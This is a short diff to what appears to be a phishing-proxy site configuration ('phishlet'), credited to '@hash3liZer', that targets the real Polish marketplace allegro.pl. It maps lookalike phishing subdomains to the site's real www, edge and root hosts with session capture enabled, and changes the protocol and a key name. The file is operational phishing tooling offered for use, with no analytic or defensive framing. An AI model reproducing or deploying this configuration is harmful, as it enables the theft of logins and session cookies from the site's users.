@@ -1,8 +1,8 @@
 creator: '@hash3liZer'
 name: 'allegro'
-proto: 'https'
+proto: 'http'
 
-proxy_hosts:
+subdomains:
   - {phish_sub: '', orig_sub: '', domain: 'allegro.pl', session: true, is_landing: false, auto_filter: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'allegro.pl', session: true, is_landing: true, auto_filter: false}
   - {phish_sub: 'edge', orig_sub: 'edge', domain: 'allegro.pl', session: true, is_landing: false, auto_filter: false}
